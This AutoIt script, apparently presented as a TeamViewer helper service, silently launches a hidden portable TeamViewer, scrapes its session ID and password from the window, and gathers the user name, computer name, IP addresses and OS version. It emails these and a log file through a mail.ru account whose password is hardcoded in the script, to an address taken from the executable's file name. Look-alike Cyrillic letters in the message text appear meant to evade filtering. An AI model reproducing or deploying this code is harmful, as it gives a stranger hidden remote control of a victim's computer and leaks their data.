#include <Inet.au3>
#include <File.au3>
#include <log.au3>
#include <array.au3>
Opt("WinTitleMatchMode", -1)     ;1=с началом, 2=частично, 3=точно, 4=расширено, -1 to -4=Nocase
$SmtpServer = "smtp.mail.ru"    ; адрес SMTP сервера
;~ $Port = "2525"                  ; Порт SMTP сервера
$FromAddress = "teamviewer.print@mail.ru"   ; адрес отправителя
$ToAddress = ""     ; адрес назначения
$Subject = """Служба TeаmViеwer.print"""    ; тема письма
$Body = """Ошибка, запуск не удался"""    ; тело письма (сам текст письма)
$AttachFiles = '' ; "C:\boot.ini"    ; прикреплённые файлы к письму
$sAttach=''
;~ $Username = "test@mail.ru"      ; имя пользователя аккаунта, с которого отправляется
$Password = "iopTHN1!"               ; Пароль
$sPath_ini=@ScriptDir & "\StartSettings.ini"
global $IDtv ='Не удалось получить ID', $passtv ='Не удалось получить Pаsswоrd',$PublicIP,$PIDtv=0,$EmailSendError=0
Global $iError, $oEvent = ObjEvent('AutoIt.Error', '__cdo_error'), $ReportTcpSend=0, $TrySendEmail,$HandleTVChoise=0
global $VisibleTV=1,$NotCloseTV=0
$hLog = _Log_Open(@ScriptDir & '\Start.log', '### Лог программы для запуска TeamViewer ###')
$TrySendEmail = IniRead($sPath_ini, "User_Settings", "TrySendEmail", "3")
; полуаем путь для поиска исходного архива и имя файла из которого можно извлечь Email
$sPath = @AutoItExe
$aPathArr = _PathSplitByRegExp($sPath)
$aPathArr = _PathSplitByRegExp($aPathArr[2])
$FileName = _GetFileName()
_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $FileName = ' & $FileName & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console

; получаем Email адрес из имени файла
global $GetAdress, $GetAdressError=0
	if IniRead($sPath_ini, "User_Settings", "IgnoreEmailInFileName", "0") = 1 then $FileName=''
	$ToAddress = _GetAdress($FileName)
_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $GetAdress = ' & $GetAdress & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console

_StartTV()
;~ sleep(5000)
_WaitAndGetPassTV()
;		  sleep(1000)
_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $password = ' & $passtv & @CRLF ) ;### Debug Console
_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $ID = ' & $IDtv & @CRLF ) ;### Debug Console

if $PIDtv=0 Then
	$Body="Служба обнаружила, что программа уже запущена у клиента! Попытка получить логин, пароль..."&@CRLF
Else
	$Body=''
EndIf

if $PublicIP = -1 then
	_Log_Report($hLog, '-> Пытаюсь повторить получение внешнего IP адреса '&@CRLF)
	for $i=1 to 10
		$PublicIP = _GetIP()
		if $PublicIP = -1 then ExitLoop
		sleep(100)
	Next
endif

; Формирование текста для отправки
$Body &= "Службой получены следующие данные: "&@CRLF&'Lоgin (ID):'&@CRLF&$IDtv&@CRLF&'Pаsswоrd:'&@CRLF&$passtv&@CRLF&@CRLF&'<<<Информация о клиенте:>>>'&@CRLF& _
'Имя пользователя: '&@UserName&@CRLF&'Имя компьютера: '&@ComputerName&@CRLF&'Внутренний IP адрес 1: '&@IPAddress1&';  Внутренний IP адрес 2: '&@IPAddress2&@CRLF& _
'Внешний IP адрес: '&$PublicIP&@CRLF&'Версия Windows: '&@OSVersion&'; '&@OSType ;&@CRLF&''&@CRLF&''
_Log_Report($hLog, $Body&@CRLF)

if IniRead($sPath_ini, "User_Settings", "AttachLog", "1") = 1 then $sAttach = @ScriptDir & '\Start.log'

; Отправка Email
if $sAttach='' then
	for $i=1 to $TrySendEmail
		$timerSendMailTCP=TimerInit()
		$SendMailTCP=SendMailTCP($ToAddress, $FromAddress , $Password, $Subject, $Body)
		_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $SendMailTCP = ' & $SendMailTCP & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
		_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : TimerDiff($timerSendMailTCP) = ' & TimerDiff($timerSendMailTCP) & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
		if $SendMailTCP=0 Then
			_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $EmailSendError = ' & $EmailSendError & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
			$EmailSendError=1
			$timerSendMailCDO=TimerInit()
			$SendMailCDO = __cdo_Message($ToAddress, $FromAddress, $FromAddress, $Password, $Subject, $Body , $sAttach, $SmtpServer)
			_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : TimerDiff($timerSendMailCDO) = ' & TimerDiff($timerSendMailCDO) & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
			if $SendMailCDO<>1 then
				_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $EmailSendError = ' & $EmailSendError & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
				$EmailSendError=2
				_Log_Report($hLog,  " Почта отправлена с ошибкой, ожидание и повторная попытка " & @CRLF )
				sleep(5000)
			Else
				ExitLoop
			EndIf
		Else
			ExitLoop
		EndIf
	Next
Else
	for $i=1 to $TrySendEmail
		$timerSendMailCDO=TimerInit()
		_Log_Close($hLog)
		$SendMailCDO = __cdo_Message($ToAddress, $FromAddress, $FromAddress, $Password, $Subject, $Body , $sAttach, $SmtpServer)
		$hLog = _Log_Open(@ScriptDir & '\Start.log', '### Лог программы для запуска TeamViewer ###')
		_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $SendMailCDO = ' & $SendMailCDO & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
		_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : TimerDiff($timerSendMailCDO) = ' & TimerDiff($timerSendMailCDO) & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
		if $SendMailCDO<>1 Then
			_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $EmailSendError = ' & $EmailSendError & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
			$EmailSendError=1
			$timerSendMailTCP=TimerInit()
			$SendMailTCP=SendMailTCP($ToAddress, $FromAddress , $Password, $Subject, $Body)
			_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $SendMailTCP = ' & $SendMailTCP & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
			_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : TimerDiff($timerSendMailTCP) = ' & TimerDiff($timerSendMailTCP) & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
			if $SendMailTCP<>1 then
				_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $EmailSendError = ' & $EmailSendError & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
				$EmailSendError=2
				_Log_Report($hLog,  " Почта отправлена с ошибкой, ожидание и повторная попытка " & @CRLF )
				sleep(5000)
			Else
				ExitLoop
			EndIf
		Else
			ExitLoop
		EndIf
	Next
EndIf


_Log_Report($hLog, ' Работа программы на этом закончена ' & @CRLF)
_Log_Close($hLog)
;~ $hLog = _Log_Open(@ScriptDir & '\Start.log', '### Лог программы для запуска TeamViewer ###')
;~


Func SendMailTCP($To, $sFrom, $sPassw, $sSubject, $sMessage)
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $sMessage = ' & $sMessage & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $sSubject = ' & $sSubject & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $sPassw = ' & $sPassw & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $sFrom = ' & $sFrom & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $To = ' & $To & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
    $tTCPStartup=TCPStartup()
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $tTCPStartup = ' & $tTCPStartup & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console

    $iSocket = TCPConnect(TCPNameToIP('smtp.mail.ru'), 25)
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $iSocket = ' & $iSocket & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
    $tTCPSend=TCPSend($iSocket, 'HELO ' & @LogonDomain & @CRLF)
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $tTCPSend = ' & $tTCPSend & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
	local $TimeOut = TimerInit()
    While 1
        $sRecv = TCPRecv($iSocket, 2048)
		;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $sRecv = ' & $sRecv & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
        If $sRecv <> '' Then
            If StringRegExp($sRecv, '250 smtp(.*).mail.ru') Then TCPSend($iSocket, 'AUTH LOGIN' & @CRLF)
            If StringInStr($sRecv, 'VXNlcm5hbWU6') Then TCPSend($iSocket, _Base64_Encode($sFrom))
            If StringInStr($sRecv, 'UGFzc3dvcmQ6') Then TCPSend($iSocket, _Base64_Encode($sPassw))
            If StringInStr($sRecv, 'Authentication succeeded') Then
                TCPSend($iSocket, 'MAIL FROM: ' & $sFrom & @CRLF)
				;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : TCPSend($iSocket, ''MAIL FROM: '' & $sFrom & @CRLF) = ' & TCPSend($iSocket, 'MAIL FROM: ' & $sFrom & @CRLF) & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
                TCPSend($iSocket, 'RCPT TO: ' & $To & @CRLF)
				;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : TCPSend($iSocket, ''RCPT TO: '' & $To & @CRLF) = ' & TCPSend($iSocket, 'RCPT TO: ' & $To & @CRLF) & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
			EndIf
;~ 			If StringInStr($sRecv, '250 OK') Then TCPSend($iSocket, 'DATA' & @CRLF)
            If StringInStr($sRecv, '250 Accepted') Then TCPSend($iSocket, 'DATA' & @CRLF)
            If StringInStr($sRecv, '354 Enter message') Then
                TCPSend($iSocket, 'From: ' & $sFrom & @CRLF)
                TCPSend($iSocket, 'Subject: ' & $sSubject & @CRLF & @CRLF)
                TCPSend($iSocket, $sMessage & @CRLF)
                TCPSend($iSocket, '.' & @CRLF )
            EndIf
            If StringInStr($sRecv, '250 OK id=') Then
                TCPSend($iSocket, 'QUIT' & @CRLF)
                ExitLoop
            EndIf
        EndIf
        Switch StringMid($sRecv, 1, 3)
			Case 421 To 554
				;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $sRecv = ' & $sRecv & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
				if StringInStr($sRecv,'OK',1)=0 then
					_Log_Report($hLog, '---->>> Ошибка отправки почты <<<----'&@CRLF)
					$EmailSendError=1
				endif
                Return SetError(-1, 0, 0)
		EndSwitch
		sleep(1)
		if TimerDiff($TimeOut)>40000 then
			_Log_Report($hLog, ' Ошибка отпрвки почты по TCP, время ожидания больше 40 секунд. ')
			Return SetError(-1, 0, 0)
		EndIf

    Wend

    $tTCPCloseSocket = TCPCloseSocket($iSocket)
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $tTCPCloseSocket = ' & $tTCPCloseSocket & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
    $tTCPShutdown=TCPShutdown()
	;if $ReportTcpSend=1 then _Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $tTCPShutdown = ' & $tTCPShutdown & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console



    Return 1
EndFunc

Func _Base64_Encode($sData, $iFlag = 1)
    Local $Ret, $bData, $tData, $tText
    $bData = StringToBinary($sData, $iFlag)
    $tData = DllStructCreate('byte[' & BinaryLen($bData) & ']')
    DllStructSetData($tData, 1, $bData)
    $Ret = DllCall('crypt32.dll', 'bool', 'CryptBinaryToStringW', 'ptr', DllStructGetPtr($tData), 'dword', DllStructGetSize($tData), 'dword', 1, 'ptr', 0, 'dword*', 0)
    If (@error) Or (Not $Ret[0]) Then
        Return SetError(1, 0, '')
    EndIf
    $tText = DllStructCreate('wchar[' & $Ret[5] & ']')
    $Ret = DllCall('crypt32.dll', 'bool', 'CryptBinaryToStringW', 'ptr', DllStructGetPtr($tData), 'dword', DllStructGetSize($tData), 'dword', 1, 'ptr', DllStructGetPtr($tText), 'dword*', $Ret[5])
    If (@error) Or (Not $Ret[0]) Then
        Return SetError(1, 0, '')
    EndIf
    Return DllStructGetData($tText, 1)
EndFunc

Func __cdo_Message($sToAddress, $sFromName, $sFromAddress, $sPassword, $sSubject = '', $sBody = '', $sAttach = '', $sServer = 'smtp.mail.ru', $iPort = 25, $iSSL = 0)
    Local $oEmail = ObjCreate('CDO.Message')
    If (Not IsObj($oEmail)) Then
		_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & '(Not IsObj($oEmail))'& @CRLF)
        Return SetError(1, 0, 0)
    EndIf
    $oEmail.From = '"' & $sFromName & '" <' & $sFromAddress & '>'
    $oEmail.To = $sToAddress
    $oEmail.Subject = $sSubject
    $oEmail.TextBody = $sBody & @CRLF
    If ($sAttach <> '') Then
        If FileExists($sAttach) Then
            $oEmail.AddAttachment($sAttach)
        Else
            Return SetError(2, 0, 0)
        EndIf
    EndIf
    $oEmail.Configuration.Fields.Item('http://schemas.microsoft.com/cdo/configuration/sendusing') = 2
    $oEmail.Configuration.Fields.Item('http://schemas.microsoft.com/cdo/configuration/smtpserver') = $sServer
    $oEmail.Configuration.Fields.Item('http://schemas.microsoft.com/cdo/configuration/smtpserverport') = $iPort
    $oEmail.Configuration.Fields.Item('http://schemas.microsoft.com/cdo/configuration/smtpauthenticate') = 1
    $oEmail.Configuration.Fields.Item('http://schemas.microsoft.com/cdo/configuration/sendusername') = $sFromAddress
    $oEmail.Configuration.Fields.Item('http://schemas.microsoft.com/cdo/configuration/sendpassword') = $sPassword
    $oEmail.Configuration.Fields.Item('http://schemas.microsoft.com/cdo/configuration/smtpusessl') = $iSSL
    $oEmail.Configuration.Fields.Update
    $oEmail.Send
    If $iError Then
        $iError = 0
        Return SetError(3, 0, 0)
    EndIf
    Return 1
EndFunc

Func __cdo_error()
	_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : __cdo_error() = '  &  @CRLF) ;### Debug Console
	$EmailSendError=2
    $iError = $oEvent.Number
EndFunc











Func _StartTV()

	;~ $dir='C:\Users\Focus\AppData\Local\Temp\TeamViewer'
	;~ ShellExecute($dir)
	;~ sleep(500)
	if ProcessExists('TeamViewer.exe') = 0 then
		$PIDtv=Run('"'&@ScriptDir&'\TeamViewer.exe" --noInstallation',"",@SW_HIDE)
		_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $PIDtv = ' & $PIDtv  & ' >Error code: ' & @error & @CRLF) ;### Debug Console
		sleep(2000)
		$PublicIP = _GetIP()
		_Log_Report($hLog, ' Начинаю ожидать активного окна "TeamViewer"'&@CRLF)
		WinWaitActive("TeamViewer",'',20)
		_Log_Report($hLog, ' Начинаю ожидать появления окна "TeamViewer"'&@CRLF)
		WinWait("TeamViewer",'',20)
		_Log_Report($hLog, ' Начинаю ожидать активного окна "TeamViewer"'&@CRLF)
		$hwnd2=WinWaitActive("TeamViewer",'',20)
		_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $hwnd2 = ' & $hwnd2 & @CRLF ) ;### Debug Console
	Else
		if WinExists("TeamViewer")=1 then
	;~ 		WinActive("TeamViewer")
		Else
			_Log_Report($hLog, ' Ошибка процесс есть, а окно не существует '&@CRLF)
		EndIf
		$PublicIP = _GetIP()
	EndIf
EndFunc

Func _WaitAndGetPassTV()
	if $PIDtv<>0 then
		ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $PIDtv = ' & $PIDtv & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
		$arrayHwnds = _WinGetHandleEx($PIDtv, "", "", "", 1)
		for $i=0 to 299
			;закрытие всех лишних окон TeamViewer
			if $NotCloseTV=0 then
				For $i=0 to ubound($arrayHwnds)-1
					Opt("WinTitleMatchMode", 3)
					$t=0
					$tClose=0
					if WinGetTitle($arrayHwnds[$i])<>'TeamViewer' Then
						Opt("WinTitleMatchMode", -1)
						if WinGetTitle($arrayHwnds[$i])<>'Панель TeamViewer' then
							$t = WinClose($arrayHwnds[$i])
							ConsoleWrite('-->>')
							$tClose+=1
						EndIf
					EndIf
				;~ 	if ubound($arrayHwnds)>$tClose then
					ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $t = ' & $t & ' : WinGetTitle($arrayHwnds[$i]) = ' & WinGetTitle($arrayHwnds[$i])  & @CRLF ) ;### Debug Console
				;~ 	sleep(1000)
				Next
				Opt("WinTitleMatchMode", -1)
			EndIf

			$arrayHwnds = _WinGetHandleEx($PIDtv, "", "", "", $VisibleTV)
			; алгоритм выбора разных окон TV
			if not @error then
				if ubound($arrayHwnds)>1 Then
	;~ 				switch ubound($arrayHwnds)
	;~ 					case 1
					if $HandleTVChoise=0 then
						$HandleTV=$arrayHwnds[ubound($arrayHwnds)-1]
						$HandleTVChoise=ubound($arrayHwnds)-1
					Else
						$HandleTV=$arrayHwnds[$HandleTVChoise-1]
					EndIf
				Else
					$HandleTV=$arrayHwnds[0]
				EndIf
			Else
				$VisibleTV=0
				$HandleTV='TeamViewer'
				$NotCloseTV=1
			EndIf

			;		  sleep(1000)
			_MinimizeTV($HandleTV)
			;		  sleep(1000)
			$IDtv=ControlGetText ( $HandleTV, "", "[CLASS:Edit; INSTANCE:2]" )
			;		  sleep(1000)
			$passtv=ControlGetText ( $HandleTV, "", "[CLASS:Edit; INSTANCE:3]" )
			;		  sleep(1000)
			if StringRegExp ($passtv,'[0-9]')<>0 then ExitLoop
			if $i>0 and MOD($i,99)=0 then
				_Log_Report($hLog, ' Продолжаю ожидать окна TeamViewer... '&@CRLF)
				WinActivate("TeamViewer")
				For $i=0 to ubound($arrayHwnds)-1
					WinActivate($arrayHwnds[$i])
				Next
			endif
			sleep(100)
		Next
	Else
		for $i=0 to 299
			WinClose("Компьютеры и контакты")
			WinClose("TeamViewer - ")
			;		  sleep(1000)
			if $PIDtv<>0 then _MinimizeTV("TeamViewer")
			;		  sleep(1000)
			$IDtv=ControlGetText ( "TeamViewer", "", "[CLASS:Edit; INSTANCE:2]" )
			;		  sleep(1000)
			$passtv=ControlGetText ( "TeamViewer", "", "[CLASS:Edit; INSTANCE:3]" )
			;		  sleep(1000)
			if StringRegExp ($passtv,'[0-9]')<>0 then ExitLoop
			if $i>0 and MOD($i,23)=0 then WinActivate("TeamViewer")
			if $i>0 and MOD($i,49)=0 then
				_Log_Report($hLog, ' Продолжаю ожидать окна TeamViewer, попытка получить PID... '&@CRLF)
				$PIDtv = ProcessExists("TeamViewer.exe")
				return _WaitAndGetPassTV()
			endif
			sleep(100)
		Next
	EndIf
	if Ubound($arrayHwnds)>0 Then
		_MinimizeTV($arrayHwnds)
	Else
		_MinimizeTV("TeamViewer")
	EndIf
EndFunc

Func _MinimizeTV($hWND)
	if Ubound($hWND)>0 Then
		For $i=0 to ubound($hWND)-1
			WinSetState($hWND[$i], "", @SW_MINIMIZE )
		Next
	Else
		WinSetState($hWND, "", @SW_MINIMIZE )
	EndIf
EndFunc



Func _GetAdress($AutoItExe='')
;~ $AutoItExe=InputBox('','','TeamViewer newlogin7@gmail.com.exe')
;~ 	if $AutoItExe='' then
;~ 		$AutoItExe=StringReplace(@AutoItExe,".exe","")
;~ 	EndIf
;~ 	$GetAdress = StringRegExp($AutoItExe,'(\.|_|-| )([A-Za-z0-9._-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}).exe',1)
;~ 		ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : StringinStr($AutoItExe,''#'') = ' & StringinStr($AutoItExe,'#') & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
	if StringinStr($AutoItExe,'#')<>0 then
		$GetAdress = StringRegExp($AutoItExe,'#([A-Za-z0-9._-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}).exe',1)
	Else
		$GetAdress = StringRegExp($AutoItExe,'([A-Za-z0-9._-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}).exe',1)
	EndIf
;~ 		ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $GetAdress = ' & $GetAdress[0] & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
;~ 		ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $GetAdress = ' & $GetAdress[1] & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console

	if not @error and ubound($GetAdress)>0 then ;
;~ 		msgbox(0,'',$GetAdress[1])
		_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $GetAdress = ' & $GetAdress[0] & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
		$GetAdress=$GetAdress[0]
	Else
		$GetAdress = IniRead($sPath_ini, "User_Settings", "EmailToSend", "")
;~ 		MsgBox(0,'','|'&$GetAdress&'|')
		if $GetAdress = '' then
			$GetAdressError=1
			$AutoItExe=InputBox('Введите Email','Пожалуйста введите Email контакта которому хотите передать управление. ','newlogin7@gmail.com')
			if StringInStr($AutoItExe,'.exe')<>0 then
				return _GetAdress($AutoItExe)
			Else
				return $AutoItExe
			endif
		Endif
	EndIf
	return $GetAdress
EndFunc

Func _GetFileName()
	$iStart = TimerInit()
	$sDir = $aPathArr[2]
	$iIndex = 0
	$iTime = 0
	$iTimeOld = 0
	$aFileList = _FileListToArray($sDir, '*@*.exe', 1)
	_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $sDir = ' & $sDir & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
	_Log_Report($hLog, '@@ Debug(' & @ScriptLineNumber & ') : $aFileList = ' & $aFileList & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
	If Not @error Then
		For $i = 1 To $aFileList[0]
			$iTime = FileGetTime($sDir & '\' & $aFileList[$i], 2, 1)
			If $iTimeOld < $iTime Then
				$iTimeOld = $iTime
				$iIndex = $i
			EndIf
		Next
	;~     MsgBox(0, 'Время выполнения : ' & Round(TimerDiff($iStart), 2) & ' ms', "Самый новый файл: " & $aFileList[$iIndex])
	;~ 	$aFileList[$iIndex]
	EndIf
	return $aFileList[$iIndex]
Endfunc

Func _WinGetHandleEx($iPID, $sClassNN="", $sPartTitle="", $sText="", $iVisibleOnly=1)
    If IsString($iPID) Then $iPID = ProcessExists($iPID)
	Dim $ResultList[1]
    Local $sWList_Str = "[CLASS:" & $sClassNN & ";REGEXPTITLE:(?i).*" & $sPartTitle & ".*]"
    If $sClassNN = "" Then $sWList_Str = "[REGEXPTITLE:(?i).*" & $sPartTitle & ".*]"

    Local $aWList = WinList($sWList_Str, $sText)
    If @error Then Return SetError(1, 0, "")
		ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $aWList[0][0] = ' & $aWList[0][0] & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console

    For $i = 1 To $aWList[0][0]
        If WinGetProcess($aWList[$i][1]) = $iPID Then
            If Not $iVisibleOnly Or ($iVisibleOnly And BitAND(WinGetState($aWList[$i][1]), 2)) Then
				ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : Ubound($ResultList) = ' & Ubound($ResultList) & ') : WinGetTitle($aWList[$i][1]) = ' & WinGetTitle($aWList[$i][1]) & ') : $aWList[$i][1] = ' & $aWList[$i][1] & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
				if $ResultList[0]>0 then  Redim $ResultList[Ubound($ResultList)+1]
				$ResultList[Ubound($ResultList)-1]=$aWList[$i][1]
;~ 				Return $aWList[$i][1]
			EndIf
        EndIf
    Next
;~ 	_ArrayDisplay($ResultList)
	if not @error and Ubound($ResultList)>0 and $ResultList[0]>0 then Return $ResultList
    Return SetError(2, 0, "")
EndFunc

;===============================================================================
; Function Name:    _PathSplitByRegExp()
; Description:      Split the path to 8 elements.
; Parameter(s):     $sPath - Path to split.
; Requirement(s):
; Return Value(s):  On seccess - Array $aRetArray that contain 8 elements:
;                   $aRetArray[0] = Full path ($sPath)
;                   $aRetArray[1] = Drive letter
;                   $aRetArray[2] = Path without FileName and extension
;                   $aRetArray[3] = Full path without File Extension
;                   $aRetArray[4] = Full path without drive letter
;                   $aRetArray[5] = FileName and extension
;                   $aRetArray[6] = Just Filename
;                   $aRetArray[7] = Just Extension of a file
;
;                   On failure - If $sPath not include correct path (the path is not splitable),
;                   then $sPath returned.
;                   If $sPath not include needed delimiters, or it's emty,
;                   then @error set to 1, and returned -1.
;
; Note(s):          The path can include backslash as well (exmp: C:/test/test.zip).
;
; Author(s):        G.Sandler a.k.a CreatoR (MsCreatoR) - Thanks to amel27 for help with RegExp
;===============================================================================
Func _PathSplitByRegExp($sPath)
    If $sPath = "" Or (StringInStr($sPath, "\") And StringInStr($sPath, "/")) Then Return SetError(1, 0, -1)

    Local $aRetArray[8], $pDelim = ""

    If StringRegExp($sPath, '^(?i)([A-Z]:|\\)(\\[^\\]+)+$') Then $pDelim = "\"
    If StringRegExp($sPath, '(?i)(^.*:/)(/[^/]+)+$') Then $pDelim = "//"

    If $pDelim = "" Then $pDelim = "/"
    If Not StringInStr($sPath, $pDelim) Then Return $sPath
    If $pDelim = "\" Then $pDelim &= "\"

    $aRetArray[0] = $sPath ;Full path
    $aRetArray[1] = StringRegExpReplace($sPath,  $pDelim & '.*', $pDelim) ;Drive letter
    $aRetArray[2] = StringRegExpReplace($sPath, $pDelim & '[^' & $pDelim & ']*$', '') ;Path without FileName and extension
    $aRetArray[3] = StringRegExpReplace($sPath, '\.[^.]*$', '') ;Full path without File Extension
    $aRetArray[4] = StringRegExpReplace($sPath, '(?i)([A-Z]:' & $pDelim & ')', '') ;Full path without drive letter
    $aRetArray[5] = StringRegExpReplace($sPath, '^.*' & $pDelim, '') ;FileName and extension
    $aRetArray[6] = StringRegExpReplace($sPath, '.*' & $pDelim & '|\.[^.]*$', '') ;Just Filename
    $aRetArray[7] = StringRegExpReplace($sPath, '^.*\.', '') ;Just Extension of a file

    Return $aRetArray
EndFunc